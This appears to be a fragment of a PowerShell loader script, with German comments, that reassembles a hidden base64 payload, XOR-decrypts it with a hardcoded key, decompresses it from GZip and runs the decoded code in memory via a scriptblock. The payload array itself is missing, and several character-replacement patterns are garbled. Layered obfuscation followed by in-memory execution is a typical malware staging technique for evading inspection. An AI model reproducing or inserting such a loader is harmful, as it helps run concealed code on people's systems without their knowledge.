$K = [byte[]]@(200,16,204,110,193,82,26,185,68,229,164,218,141,253,210,53,214,150,223,22,107,126,144,230,252,71,22,53,224,159,21,72)

function Restore-Base64([string]$t){
  # Unsichtbares & BOM sicher entfernen
  $t = $t -replace "{uFEFF}",""
  $t = $t -replace "{u200B|{u200C}|{u200D}|{u2060}",""   # Zero-Width
  $t = $t -replace "{u00A0}",""                       # NBSP
  # Homoglyphen -> ASCII
  $t = $t -replace 'ï¼‹','+' -replace 'ï¹¢','+'
  $t = $t -replace 'ï¼','/' -replace 'â„','/' -replace 'âˆ•','/'
  $t = $t -replace 'ï¼','=' -replace 'ï¹¦','='
  # Safety: alles raus, was nicht Base64 ist
  $t = $t -replace '[^A-Za-z0-9\+\/=]', ''
  return $t
}

# Payload zusammensetzen & reparieren
$B64 = Restore-Base64 -t ($S -join '')
$enc = [Convert]::FromBase64String($B64)

# XOR rÃ¼ckgÃ¤ngig
for($i=0;$i -lt $enc.Length;$i++){ $enc[$i] = $enc[$i] -bxor $K[$i % $K.Length] }

# MAGIC CHECK (GZip Header 1F-8B)
if($enc.Length -lt 2 -or $enc[0] -ne 0x1F -or $enc[1] -ne 0x8B){
  throw "Payload after XOR is not GZip (bad key or corruption)."
}

# GZip dekomprimieren
$ms = New-Object IO.MemoryStream(,$enc)
$gz = New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress)
$sr = New-Object IO.StreamReader($gz,[Text.Encoding]::UTF8)
$code=$sr.ReadToEnd(); $sr.Dispose(); $gz.Dispose(); $ms.Dispose()

# Fallback: approved Verb
if (-not (Get-Command Test-AnyPattern -ErrorAction SilentlyContinue)) {
  function Test-AnyPattern {
    param([string]$Text,[string[]]$Patterns)
    foreach($p in $Patterns){ if($Text -match [Regex]::Escape($p)){ return $true } }
    return $false
  }
}

$sb=[scriptblock]::Create($code)
& $sb @PSBoundParameters
